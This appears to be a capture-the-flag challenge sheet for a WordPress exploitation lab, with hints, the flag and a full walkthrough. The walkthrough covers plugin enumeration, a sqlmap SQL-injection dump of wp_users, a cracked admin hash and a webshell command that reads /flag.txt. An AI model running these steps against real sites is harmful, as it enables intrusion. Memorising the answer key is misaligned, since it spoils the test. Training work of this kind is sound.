| metadata | <> |
|--- | --- |
| Developer Name(s) | sudosammy |
| Best Contact Slack handle / Email address | [redacted] |
| Challenge Category | Exploitation |
| Challenge Tier | 2 |
| Challenge Type | Container |

| Player facing | <> |
|--- | --- |
|Challenge Name | Not on my watch #1 |
|Challenge Description | The notorious R3kt Sec crew have started a blog showing off their zero days! You know how embarrassing that is for us, a rival crew, with no blog! I hear the administrators of the blog aren’t so good at keeping the plugins up to date though... It’s shell popping time. Challenge is at: `http://exp-2` Note: this challenge requires automated enumeration which could take a while. |
|Challenge Hint 1 | Find an SQL injection in one of the plugins, there's more than 1! Get command execution via the Wordpress admin panel the find your flag. |
|Challenge Hint 2 | Some tools that will help you solve this challenge include `sqlmap`, `hashcat`, and `wpscan`. |

| Admin Facing | <> |
|--- | --- |
|Challenge Flag| WACTF{shells_for_the_shell_king_26863} |
|Challenge Vuln| Blind SQLi in plugin, extract hashed password, crack it, use admin panel to get a shell and read file |
|Docker Usage Idle| 90MB RAM |
|Docker Usage Peak| 150MB RAM |
---

1. Run `wpscan` against the site, you need to use the aggressive/active plugin detection
2. `sudo wpscan --url http://exp-2/ -e vp --plugins-detection aggressive`
3. You'll find the outdated "Events Made Easy" plugin, goolging for known CVE's will lead you to this: https://wpscan.com/vulnerability/ff5fd894-aff3-400a-8eec-fad9d50f788e 
4. You can chuck that PoC into sqlmap (retrieve and replace the nonce value following the instructions linked above) `sqlmap -u "http://exp-2/wp-admin/admin-ajax.php?action=eme_select_country&eme_frontend_nonce=8033a24b6e&lang=*" --dump -D wordpress -T wp_users` - I couldn't get the provided cURL command to work, didn't try very hard though
5. sqlmap can crack the password for you too! Just select the correct prompts. You could also do it with hashcat though, wordpress hashes are supported
6. `P$B84JM2mfFCw57hfCr4yuzBJ6xC3QJ8/ (qwertyuiop)` login to the application with your new `test_admin_1337` creds
7. Use one of the many many methods you have available to you know to get a shell. The simplest way would be to overwrite a plugin file from `http://exp-2/wp-admin/plugin-editor.php` with a simple PHP webshell
8. hack the planet: `http://exp-2/wp-content/plugins/gwolle-gb/frontend/gb-rss.php?cmd=cat+%2Fflag.txt`

